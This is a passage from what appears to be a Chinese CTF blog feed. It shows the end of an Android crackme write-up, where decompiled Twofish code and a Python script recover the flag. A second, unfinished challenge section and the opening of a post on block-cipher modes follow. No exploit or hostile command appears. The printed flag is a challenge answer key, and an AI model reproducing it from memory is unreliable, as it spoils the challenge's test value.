v4;                v11_1[v2 * 2] = v3;                v3 += v4;                v11_1[v2 * 2 + 1] = v3 &gt;&gt;&gt; 23 | v3 &lt;&lt; 9;                ++v2;                v1_1 += 0x2020202;            }            v8_1 = v10[0];            v9_1 = v10[1];            v12 = v10[2];            v10_1 = v10[3];            v13 = new int[0x400];            v2 = 0;            while(true) {            label_120:                if(v2 &gt;= 0x100) {                    goto label_324;                }                switch(v7 &amp; 3) {                    case 0: {                        goto label_183;                    }                    case 1: {                        goto label_126;                    }                    case 2: {                        goto label_332;                    }                    case 3: {                        goto label_337;                    }                }                goto label_124;            }        }        catch(Throwable v1) {            goto label_8;        }    label_337:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        goto label_211;        try {        label_183:            v5 = b.a[1][v2] &amp; 0xFF ^ b.e(v10_1);            v4 = b.a[0][v2] &amp; 0xFF ^ b.f(v10_1);            v3 = b.g(v10_1) ^ b.a[0][v2] &amp; 0xFF;            v1_1 = b.a[1][v2] &amp; 0xFF ^ b.h(v10_1);        label_211:            v5 = b.a[1][v5] &amp; 0xFF ^ b.e(v12);            v4 = b.a[1][v4] &amp; 0xFF ^ b.f(v12);            v3 = b.a[0][v3] &amp; 0xFF ^ b.g(v12);            v1_1 = b.a[0][v1_1] &amp; 0xFF ^ b.h(v12);            goto label_239;        }        catch(Throwable v1) {            goto label_8;        }    label_332:        v1_1 = v2;        v3 = v2;        v4 = v2;        v5 = v2;        try {        label_239:            v13[v2 * 2] = b.b[0][b.a[0][b.a[0][v5] &amp; 0xFF ^ b.e(v9_1)] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][b.a[1][v4] &amp; 0xFF ^ b.f(v9_1)] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][b.a[0][v3] &amp; 0xFF ^ b.g(v9_1)] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][b.a[1][v1_1] &amp; 0xFF ^ b.h(v9_1)] &amp; 0xFF ^ b.h(v8_1)];            goto label_124;        label_126:            v13[v2 * 2] = b.b[0][b.a[0][v2] &amp; 0xFF ^ b.e(v8_1)];            v13[v2 * 2 + 1] = b.b[1][b.a[0][v2] &amp; 0xFF ^ b.f(v8_1)];            v13[v2 * 2 + 0x200] = b.b[2][b.a[1][v2] &amp; 0xFF ^ b.g(v8_1)];            v13[v2 * 2 + 0x201] = b.b[3][b.a[1][v2] &amp; 0xFF ^ b.h(v8_1)];        label_124:            ++v2;            goto label_120;        label_324:            v1_2 = new Object[]{v13, v11_1};        }        catch(Throwable v1) {            goto label_8;        }        __monitor_exit(v6);        return v1_2;    label_8:        __monitor_exit(v6);        throw v1;    }</code></pre><p>这个 a 函数判断传入的字节数组、、密钥都不为空，并调用 b 函数：</p><pre><code class="java">    public static byte[] a(byte[] arg1, int arg2, Object arg3) {        byte[] v0 = arg1 == null || arg3 == null || arg2 &lt; 0 ? null : b.b(arg1, arg2, arg3);        return v0;    }</code></pre><p>b 函数应该就是对数据的加密过程，明显是个 16 次轮函数的分组密码：</p><pre><code class="java">    private static byte[] b(byte[] arg12, int arg13, Object arg14) {        int[] v0 = arg14[0];        Object v1 = arg14[1];        int v2 = arg13 + 1;        int v4 = v2 + 1;        int v3 = v4 + 1;        v2 = (arg12[v2] &amp; 0xFF) &lt;&lt; 8 | arg12[arg13] &amp; 0xFF | (arg12[v4] &amp; 0xFF) &lt;&lt; 16;        v4 = v3 + 1;        v2 |= (arg12[v3] &amp; 0xFF) &lt;&lt; 24;        v3 = v4 + 1;        int v5 = v3 + 1;        v3 = (arg12[v3] &amp; 0xFF) &lt;&lt; 8 | arg12[v4] &amp; 0xFF;        v4 = v5 + 1;        v3 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 16;        v5 = v4 + 1;        v3 |= (arg12[v4] &amp; 0xFF) &lt;&lt; 24;        v4 = v5 + 1;        int v6 = v4 + 1;        v4 = (arg12[v4] &amp; 0xFF) &lt;&lt; 8 | arg12[v5] &amp; 0xFF;        v5 = v6 + 1;        v4 |= (arg12[v6] &amp; 0xFF) &lt;&lt; 16;        v6 = v5 + 1;        v4 |= (arg12[v5] &amp; 0xFF) &lt;&lt; 24;        v5 = v6 + 1;        int v7 = v5 + 1;        int v8 = (arg12[v5] &amp; 0xFF) &lt;&lt; 8 | arg12[v6] &amp; 0xFF | (arg12[v7] &amp; 0xFF) &lt;&lt; 16 | (arg12[v7 + 1] &amp; 0xFF) &lt;&lt; 24;        v7 = v2 ^ v1[0];        v6 = v3 ^ v1[1];        v5 = v4 ^ v1[2];        v4 = v8 ^ v1[3];        v3 = 8;        for(v2 = 0; v2 &lt; 16; v2 += 2) {            v8 = b.a(v0, v7, 0);            int v9 = b.a(v0, v6, 3);            int v11 = v3 + 1;            v3 = v1[v3] + (v8 + v9) ^ v5;            v5 = v3 &gt;&gt;&gt; 1 | v3 &lt;&lt; 0x1F;            v3 = v4 &lt;&lt; 1 | v4 &gt;&gt;&gt; 0x1F;            v4 = v9 * 2 + v8;            v8 = v11 + 1;            v4 = v4 + v1[v11] ^ v3;            v3 = b.a(v0, v5, 0);            v9 = b.a(v0, v4, 3);            v11 = v8 + 1;            v7 ^= v1[v8] + (v3 + v9);            v7 = v7 &lt;&lt; 0x1F | v7 &gt;&gt;&gt; 1;            v8 = v9 * 2 + v3;            v3 = v11 + 1;            v6 = (v6 &gt;&gt;&gt; 0x1F | v6 &lt;&lt; 1) ^ v8 + v1[v11];        }        int v0_1 = v1[4] ^ v5;        v2 = v1[5] ^ v4;        v3 = v1[6] ^ v7;        int v1_1 = v1[7] ^ v6;        return new byte[]{((byte)v0_1), ((byte)(v0_1 &gt;&gt;&gt; 8)), ((byte)(v0_1 &gt;&gt;&gt; 16)), ((byte)(v0_1 &gt;&gt;&gt; 24)), ((byte)v2), ((byte)(v2 &gt;&gt;&gt; 8)), ((byte)(v2 &gt;&gt;&gt; 16)), ((byte)(v2 &gt;&gt;&gt; 24)), ((byte)v3), ((byte)(v3 &gt;&gt;&gt; 8)), ((byte)(v3 &gt;&gt;&gt; 16)), ((byte)(v3 &gt;&gt;&gt; 24)), ((byte)v1_1), ((byte)(v1_1 &gt;&gt;&gt; 8)), ((byte)(v1_1 &gt;&gt;&gt; 16)), ((byte)(v1_1 &gt;&gt;&gt; 24))};    }</code></pre><p>分组密码可以去找一下特征，看到了 b 类的头上定义了两个数据，转成 16 进制之后拿去搜一下：</p><pre><code class="java">        v0[0] = new byte[]{-87, 103, -77, -24, 4, -3, -93, 0x76, -102, -110, -128, 120, -28, -35, -47, 56, 13, -58, 53, -104, 24, -9, -20, 108, 67, 0x75, 55, 38, -6, 19, -108, 72, -14, -48, -117, 0x30, -124, 84, -33, 35, 25, 91, 61, 89, -13, -82, -94, -126, 99, 1, -125, 46, -39, 81, -101, 0x7C, -90, -21, -91, -66, 22, 12, -29, 97, -64, -116, 58, -11, 0x73, 44, 37, 11, -69, 78, -119, 107, 83, 106, -76, -15, -31, -26, -67, 69, -30, -12, -74, 102, -52, -107, 3, 86, -44, 28, 30, -41, -5, -61, -114, -75, -23, -49, -65, -70, -22, 0x77, 57, -81, 51, -55, 98, 0x71, -127, 0x79, 9, -83, 36, -51, -7, -40, -27, -59, -71, 77, 68, 8, -122, -25, -95, 29, -86, -19, 6, 0x70, -78, -46, 65, 0x7B, -96, 17, 49, -62, 39, -112, 0x20, -10, 0x60, -1, -106, 92, -79, -85, -98, -100, 82, 27, 0x5F, -109, 10, -17, -111, -123, 73, -18, 45, 0x4F, -113, 59, 71, -121, 109, 70, -42, 62, 105, 100, 42, -50, -53, 0x2F, -4, -105, 5, 0x7A, -84, 0x7F, -43, 26, 75, 14, -89, 90, 40, 20, 0x3F, 41, -120, 60, 76, 2, -72, -38, -80, 23, 85, 0x1F, -118, 0x7D, 87, -57, -115, 0x74, -73, -60, -97, 0x72, 0x7E, 21, 34, 18, 88, 7, -103, 52, 110, 80, -34, 104, 101, -68, -37, -8, -56, -88, 43, 0x40, -36, -2, 50, -92, -54, 16, 33, -16, -45, 93, 15, 0, 0x6F, -99, 54, 66, 74, 94, -63, -32}; // 0xA9, 0x67, 0xB3, 0xE8, 0x04, 0xFD, 0xA3, 0x76, 0x9A, 0x92, 0x80, 0x78, 0xE4, 0xDD, 0xD1, 0x38, 0x0D, 0xC6, 0x35, 0x98, 0x18, 0xF7, 0xEC, 0x6C, 0x43, 0x75, 0x37, 0x26, 0xFA, 0x13, 0x94, 0x48, 0xF2, 0xD0, 0x8B, 0x30, 0x84, 0x54, 0xDF, 0x23, 0x19, 0x5B, 0x3D, 0x59, 0xF3, 0xAE, 0xA2, 0x82, 0x63, 0x01, 0x83, 0x2E, 0xD9, 0x51, 0x9B, 0x7C, 0xA6, 0xEB, 0xA5, 0xBE, 0x16, 0x0C, 0xE3, 0x61, 0xC0, 0x8C, 0x3A, 0xF5, 0x73, 0x2C, 0x25, 0x0B, 0xBB, 0x4E, 0x89, 0x6B, 0x53, 0x6A, 0xB4, 0xF1, 0xE1, 0xE6, 0xBD, 0x45, 0xE2, 0xF4, 0xB6, 0x66, 0xCC, 0x95, 0x03, 0x56, 0xD4, 0x1C, 0x1E, 0xD7, 0xFB, 0xC3, 0x8E, 0xB5, 0xE9, 0xCF, 0xBF, 0xBA, 0xEA, 0x77, 0x39, 0xAF, 0x33, 0xC9, 0x62, 0x71, 0x81, 0x79, 0x09, 0xAD, 0x24, 0xCD, 0xF9, 0xD8, 0xE5, 0xC5, 0xB9, 0x4D, 0x44, 0x08, 0x86, 0xE7, 0xA1, 0x1D, 0xAA, 0xED, 0x06, 0x70, 0xB2, 0xD2, 0x41, 0x7B, 0xA0, 0x11, 0x31, 0xC2, 0x27, 0x90, 0x20, 0xF6, 0x60, 0xFF, 0x96, 0x5C, 0xB1, 0xAB, 0x9E, 0x9C, 0x52, 0x1B, 0x5F, 0x93, 0x0A, 0xEF, 0x91, 0x85, 0x49, 0xEE, 0x2D, 0x4F, 0x8F, 0x3B, 0x47, 0x87, 0x6D, 0x46, 0xD6, 0x3E, 0x69, 0x64, 0x2A, 0xCE, 0xCB, 0x2F, 0xFC, 0x97, 0x05, 0x7A, 0xAC, 0x7F, 0xD5, 0x1A, 0x4B, 0x0E, 0xA7, 0x5A, 0x28, 0x14, 0x3F, 0x29, 0x88, 0x3C, 0x4C, 0x02, 0xB8, 0xDA, 0xB0, 0x17, 0x55, 0x1F, 0x8A, 0x7D, 0x57, 0xC7, 0x8D, 0x74, 0xB7, 0xC4, 0x9F, 0x72, 0x7E, 0x15, 0x22, 0x12, 0x58, 0x07, 0x99, 0x34, 0x6E, 0x50, 0xDE, 0x68, 0x65, 0xBC, 0xDB, 0xF8, 0xC8, 0xA8, 0x2B, 0x40, 0xDC, 0xFE, 0x32, 0xA4, 0xCA, 0x10, 0x21, 0xF0, 0xD3, 0x5D, 0x0F, 0x00, 0x6F, 0x9D, 0x36, 0x42, 0x4A, 0x5E, 0xC1, 0xE0        v0[1] = new byte[]{0x75, -13, -58, -12, -37, 0x7B, -5, -56, 74, -45, -26, 107, 69, 0x7D, -24, 75, -42, 50, -40, -3, 55, 0x71, -15, -31, 0x30, 15, -8, 27, -121, -6, 6, 0x3F, 94, -70, -82, 91, -118, 0, -68, -99, 109, -63, -79, 14, -128, 93, -46, -43, -96, -124, 7, 20, -75, -112, 44, -93, -78, 0x73, 76, 84, -110, 0x74, 54, 81, 56, -80, -67, 90, -4, 0x60, 98, -106, 108, 66, -9, 16, 0x7C, 40, 39, -116, 19, -107, -100, -57, 36, 70, 59, 0x70, -54, -29, -123, -53, 17, -48, -109, -72, -90, -125, 0x20, -1, -97, 0x77, -61, -52, 3, 0x6F, 8, -65, 0x40, -25, 43, -30, 0x79, 12, -86, -126, 65, 58, -22, -71, -28, -102, -92, -105, 0x7E, -38, 0x7A, 23, 102, -108, -95, 29, 61, -16, -34, -77, 11, 0x72, -89, 28, -17, -47, 83, 62, -113, 51, 38, 0x5F, -20, 0x76, 42, 73, -127, -120, -18, 33, -60, 26, -21, -39, -59, 57, -103, -51, -83, 49, -117, 1, 24, 35, -35, 0x1F, 78, 45, -7, 72, 0x4F, -14, 101, -114, 120, 92, 88, 25, -115, -27, -104, 87, 103, 0x7F, 5, 100, -81, 99, -74, -2, -11, -73, 60, -91, -50, -23, 104, 68, -32, 77, 67, 105, 41, 46, -84, 21, 89, -88, 10, -98, 110, 71, -33, 52, 53, 106, -49, -36, 34, -55, -64, -101, -119, -44, -19, -85, 18, -94, 13, 82, -69, 2, 0x2F, -87, -41, 97, 30, -76, 80, 4, -10, -62, 22, 37, -122, 86, 85, 9, -66, -111}; // 0x75, 0xF3, 0xC6, 0xF4, 0xDB, 0x7B, 0xFB, 0xC8, 0x4A, 0xD3, 0xE6, 0x6B, 0x45, 0x7D, 0xE8, 0x4B, 0xD6, 0x32, 0xD8, 0xFD, 0x37, 0x71, 0xF1, 0xE1, 0x30, 0x0F, 0xF8, 0x1B, 0x87, 0xFA, 0x06, 0x3F, 0x5E, 0xBA, 0xAE, 0x5B, 0x8A, 0x00, 0xBC, 0x9D, 0x6D, 0xC1, 0xB1, 0x0E, 0x80, 0x5D, 0xD2, 0xD5, 0xA0, 0x84, 0x07, 0x14, 0xB5, 0x90, 0x2C, 0xA3, 0xB2, 0x73, 0x4C, 0x54, 0x92, 0x74, 0x36, 0x51, 0x38, 0xB0, 0xBD, 0x5A, 0xFC, 0x60, 0x62, 0x96, 0x6C, 0x42, 0xF7, 0x10, 0x7C, 0x28, 0x27, 0x8C, 0x13, 0x95, 0x9C, 0xC7, 0x24, 0x46, 0x3B, 0x70, 0xCA, 0xE3, 0x85, 0xCB, 0x11, 0xD0, 0x93, 0xB8, 0xA6, 0x83, 0x20, 0xFF, 0x9F, 0x77, 0xC3, 0xCC, 0x03, 0x6F, 0x08, 0xBF, 0x40, 0xE7, 0x2B, 0xE2, 0x79, 0x0C, 0xAA, 0x82, 0x41, 0x3A, 0xEA, 0xB9, 0xE4, 0x9A, 0xA4, 0x97, 0x7E, 0xDA, 0x7A, 0x17, 0x66, 0x94, 0xA1, 0x1D, 0x3D, 0xF0, 0xDE, 0xB3, 0x0B, 0x72, 0xA7, 0x1C, 0xEF, 0xD1, 0x53, 0x3E, 0x8F, 0x33, 0x26, 0x5F, 0xEC, 0x76, 0x2A, 0x49, 0x81, 0x88, 0xEE, 0x21, 0xC4, 0x1A, 0xEB, 0xD9, 0xC5, 0x39, 0x99, 0xCD, 0xAD, 0x31, 0x8B, 0x01, 0x18, 0x23, 0xDD, 0x1F, 0x4E, 0x2D, 0xF9, 0x48, 0x4F, 0xF2, 0x65, 0x8E, 0x78, 0x5C, 0x58, 0x19, 0x8D, 0xE5, 0x98, 0x57, 0x67, 0x7F, 0x05, 0x64, 0xAF, 0x63, 0xB6, 0xFE, 0xF5, 0xB7, 0x3C, 0xA5, 0xCE, 0xE9, 0x68, 0x44, 0xE0, 0x4D, 0x43, 0x69, 0x29, 0x2E, 0xAC, 0x15, 0x59, 0xA8, 0x0A, 0x9E, 0x6E, 0x47, 0xDF, 0x34, 0x35, 0x6A, 0xCF, 0xDC, 0x22, 0xC9, 0xC0, 0x9B, 0x89, 0xD4, 0xED, 0xAB, 0x12, 0xA2, 0x0D, 0x52, 0xBB, 0x02, 0x2F, 0xA9, 0xD7, 0x61, 0x1E, 0xB4, 0x50, 0x04, 0xF6, 0xC2, 0x16, 0x25, 0x86, 0x56, 0x55, 0x09, 0xBE, 0x91</code></pre><p>发现是 twofish 算法：</p><p><img src="/pics/攻防世界-MOBILE-新手练习区/2.png" srcset="/img/loading.gif" alt></p><p>上面的一些资源可以在 Resources/values/public.xml 中找到 ID 对应的字符串名：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;public id=&quot;0x7f04001a&quot; name=&quot;activity_main&quot; type=&quot;layout&quot; /&gt;  ...  &lt;public id=&quot;0x7f060022&quot; name=&quot;no&quot; type=&quot;string&quot; /&gt;  &lt;public id=&quot;0x7f060023&quot; name=&quot;two_fish&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f060025&quot; name=&quot;yes&quot; type=&quot;string&quot; /&gt;  ...  &lt;public id=&quot;0x7f0b0054&quot; name=&quot;edit_text&quot; type=&quot;id&quot; /&gt;  &lt;public id=&quot;0x7f0b0055&quot; name=&quot;button&quot; type=&quot;id&quot; /&gt;  ...&lt;/resources&gt;</code></pre><p>可以在 Resources/values/strings.xml 中找到对应的字符串：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;resources&gt;  ...  &lt;string name=&quot;no&quot;&gt;    NO~ You don&#39;t get me~ T_T&lt;/string&gt;  &lt;string name=&quot;two_fish&quot;&gt;    I have a male fish and a female fish.&lt;/string&gt;  &lt;string name=&quot;what_else&quot;&gt;    What else?&lt;/string&gt;  &lt;string name=&quot;yes&quot;&gt;    Yes! You got me! :)&lt;/string&gt;&lt;/resources&gt;</code></pre><p>最后找个库实现一下解密：</p><pre><code class="python">#!/usr/bin/env pythonfrom twofish import Twofishciphertext = [0x88, 0x4D, 0xF2, 0xDA, 0x11, 0x05, 0xD6, 0x2C, 0xE0, 0x6D, 0x55, 0x1F, 0x18, 0xA5, 0x90, 0xAD, 0x40, 0xAD, 0x80, 0x54, 0x05, 0xA2, 0x9E, 0xE2, 0x12, 0x46, 0xE6, 0x47, 0x05, 0x9D, 0xC2, 0xC6, 0x75, 0x1D, 0xD4, 0x06, 0x70, 0xFC, 0x51, 0x54, 0x09, 0x16, 0xCD, 0x5F, 0xDE, 0x0C, 0x2F, 0x4D]ciphertext = &#39;&#39;.join([chr(c) for c in ciphertext])T = Twofish(&#39;I have a male fish and a female &#39;)flag = &#39;&#39;for i in range(0, 48, 16):    flag += T.decrypt(ciphertext[i:i+16])print flag# qwb{TH3y_Io&lt;e_EACh_OTh3r_FOrEUER}</code></pre><h1 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h1><p>TODO</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;xyz.konso.testsrtp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2166767&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;15&quot; android:targetSdkVersion=&quot;23&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CHANGE_NETWORK_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.READ_CONTACTS&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.BROADCAST_STICKY&quot; /&gt;    注：部分手机如无此权限会报错    &lt;uses-permission android:name=&quot;android.permission.BLUETOOTH&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.MODIFY_AUDIO_SETTINGS&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/icon&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot;&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.view&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;xyz.konso.testsrtp.SplashActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.content.Intent;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.os.Handler;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.widget.TextView;public class SplashActivity extends Activity {    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        getWindow().setFlags(AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT, AccessibilityNodeInfoCompat.ACTION_NEXT_HTML_ELEMENT);        setContentView(R.layout.activity_splash);        try {            ((TextView) findViewById(R.id.versionNumber)).setText(&quot;Version &quot; + getPackageManager().getPackageInfo(&quot;com.lyt.android&quot;, 0).versionName);        } catch (NameNotFoundException e) {            e.printStackTrace();        }        new Handler().postDelayed(new Runnable() {            public void run() {                SplashActivity.this.startActivity(new Intent(SplashActivity.this, MainActivity.class));                SplashActivity.this.finish();            }        }, 2500);    }}</code></pre><pre><code class="java">package xyz.konso.testsrtp;import android.app.Activity;import android.media.AudioManager;import android.os.Bundle;import android.util.Log;import android.widget.Button;import android.widget.Toast;import com.iflytek.cloud.InitListener;import com.iflytek.cloud.RecognizerListener;import com.iflytek.cloud.RecognizerResult;import com.iflytek.cloud.SpeechConstant;import com.iflytek.cloud.SpeechError;import com.iflytek.cloud.SpeechRecognizer;import com.iflytek.cloud.SpeechSynthesizer;import com.iflytek.cloud.SpeechUtility;import com.iflytek.cloud.SynthesizerListener;import org.json.JSONObject;public class MainActivity extends Activity {    private String TAG = &quot;shitou&quot;;    private Button button1;    private Button button2;    private AudioManager mAudioManager;    private SpeechRecognizer mIat;    private InitListener mInitListener = new InitListener() {        public void onInit(int code) {            Log.d(MainActivity.this.TAG, &quot;SpeechRecognizer init() code = &quot; + code);        }    };    private SynthesizerListener mSynListener = new SynthesizerListener() {        public void onCompleted(SpeechError error) {        }        public void onBufferProgress(int percent, int beginPos, int endPos, String info) {        }        public void onSpeakBegin() {            Log.d(MainActivity.this.TAG, &quot;speakcheck&quot;);        }        public void onSpeakPaused() {        }        public void onSpeakProgress(int percent, int beginPos, int endPos) {        }        public void onSpeakResumed() {        }        public void onEvent(int arg0, int arg1, int arg2, Bundle arg3) {        }    };    private SpeechSynthesizer mTts;    private RecognizerListener recognizerListener = new RecognizerListener() {        public void onBeginOfSpeech() {        }        public void onError(SpeechError error) {        }        public void onEndOfSpeech() {        }        public void onResult(RecognizerResult results, boolean isLast) {            Log.d(MainActivity.this.TAG, results.getResultString());            try {                MainActivity.this.ss = new JSONObject(results.getResultString()).getJSONArray(&quot;ws&quot;).getJSONObject(0).getJSONArray(&quot;cw&quot;).getJSONObject(0).getString(&quot;w&quot;);            } catch (Exception e) {                Log.d(MainActivity.this.TAG, &quot;catch Excepetion&quot;);            }            if (MainActivity.this.ss.equals(&quot;\u4f60\u597d&quot;)) { // 你好                MainActivity.this.getsna();            }            Log.d(MainActivity.this.TAG, MainActivity.this.ss);        }        public void onVolumeChanged(int volume, byte[] var2) {        }        public void onEvent(int eventType, int arg1, int arg2, Bundle obj) {        }    };    private JSONObject res;    private String ss;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(new background(this));        this.mAudioManager = (AudioManager) getSystemService(&quot;audio&quot;);        this.mAudioManager.setBluetoothScoOn(true);        this.mAudioManager.startBluetoothSco();        SpeechUtility.createUtility(this, &quot;appid=561e6833&quot;);        this.mIat = SpeechRecognizer.createRecognizer(this, this.mInitListener);        this.mTts = SpeechSynthesizer.createSynthesizer(this, null);    }    public void setParam() {        this.mIat.setParameter(SpeechConstant.DOMAIN, &quot;iat&quot;);        this.mIat.setParameter(SpeechConstant.LANGUAGE, &quot;zh_cn&quot;);        this.mIat.setParameter(SpeechConstant.ACCENT, &quot;mandarin&quot;);    }    public void getsna() {        Toast.makeText(this, &quot;haha&quot;, 0).show();    }    protected void onDestroy() {        super.onDestroy();        this.mAudioManager.setBluetoothScoOn(false);        this.mAudioManager.stopBluetoothSco();    }}</code></pre><pre><code class="cpp">signed int __fastcall JNI_OnLoad(_JavaVM *vm){  jclass v2; // r4  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( vm-&gt;functions-&gt;GetEnv(&amp;vm-&gt;functions, (void **)&amp;env, 65540) )    return -1;  if ( byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;JNI_OnLoad is called !&quot;);  v2 = env-&gt;functions-&gt;FindClass(&amp;env-&gt;functions, &quot;java/io/FileDescriptor&quot;);  if ( !v2 &amp;&amp; byte_FF45C )    _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find Java class java.io.FileDescriptor&quot;);  dword_FFC14 = (int)env-&gt;functions-&gt;GetFieldID(&amp;env-&gt;functions, v2, &quot;descriptor&quot;, &quot;I&quot;);  if ( dword_FFC14 || !byte_FF45C )             // get descriptor in FileDescriptor and judge    return 65540;  _android_log_write(3, &quot;MSC_LOG&quot;, &quot;Unable to find descriptor field in java.io.FileDescriptor&quot;);  return 65540;}</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.jianshu.com/p/a2f826064e29" target="_blank" rel="noopener">https://www.jianshu.com/p/a2f826064e29</a><br><a href="https://blog.csdn.net/jscese/article/details/51005447" target="_blank" rel="noopener">https://blog.csdn.net/jscese/article/details/51005447</a><br><a href="https://blog.csdn.net/zhuzhuzhu22/article/details/80306203" target="_blank" rel="noopener">https://blog.csdn.net/zhuzhuzhu22/article/details/80306203</a><br><a href="https://blog.csdn.net/ldpxxx/article/details/9253369" target="_blank" rel="noopener">https://blog.csdn.net/ldpxxx/article/details/9253369</a><br><a href="https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex" target="_blank" rel="noopener">https://stackoverflow.com/questions/23624212/how-to-convert-a-float-into-hex</a><br><a href="https://www.52pojie.cn/thread-1105062-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1105062-1-1.html</a><br><a href="https://blog.csdn.net/jason0539/article/details/10049899" target="_blank" rel="noopener">https://blog.csdn.net/jason0539/article/details/10049899</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分组密码的工作模式</title>
    <link href="/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2020/02/17/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>复习一下密码学。</p><a id="more"></a><h1 id="分组密码的工作模式简介"><a href="#分组密码的工作模式简介" class="headerlink" title="分组密码的工作模式简介"></a>分组密码的工作模式简介</h1><p>密码学中，区块（block）密码的工作模式（mode of operation）允许使用同一个区块密码密钥对多于一块的数据进行加密，并保证其安全性。区块密码自身只能加密长度等于密码区块长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到符合密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。</p><p>工作模式主要用来进行加密和认证。对加密模式的研究曾经包含数据的完整性保护，即在某些数据被修改后的情况下密码的误差传播特性。后来的研究则将完整性保护作为另一个完全不同的，与加密无关的密码学目标。部分现代的工作模式用有效的方法将加密和认证结合起来，称为认证加密模式。</p><p>虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对 RSA 进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p><h1 id="初始化向量（IV）"><a href="#初始化向量（IV）" class="headerlink" title="初始化向量（IV）"></a>初始化向量（IV）</h1><p>初始化向量（IV，Initialization Vector）是许多工作模式中用于将加密随机化的一个位块，由此即使同样的明文被多次加密也会产生不同的密文，避免了较慢的重新产生密钥的过程。</p><p>初始化向量与密钥相比有不同的安全性需求，因此 IV 通常无须保密，然而在大多数情况中，不应当在使用同一密钥的情况下两次使用同一个 IV。对于 CBC 和 CFB，重用 IV 会导致泄露明文首个块的某些信息，亦包括两个不同消息中相同的前缀。对于 OFB 和 CTR 而言，重用 IV 会导致完全失去安全性。另外，在 CBC 模式中，IV 在加密时必须是无法预测的；特别的，在许多实现中使用的产生 IV 的方法，例如 SSL2.0 使用的，即采用上一个消息的最后一块密文作为下一个消息的 IV，是不安全的。</p><h1 id="填充（padding）"><a href="#填充（padding）" class="headerlink" title="填充（padding）"></a>填充（padding）</h1><p>块密码只能对确定长度的数据块进行处理，而消息的长度通常是可变的。因此部分模式（即 ECB 和 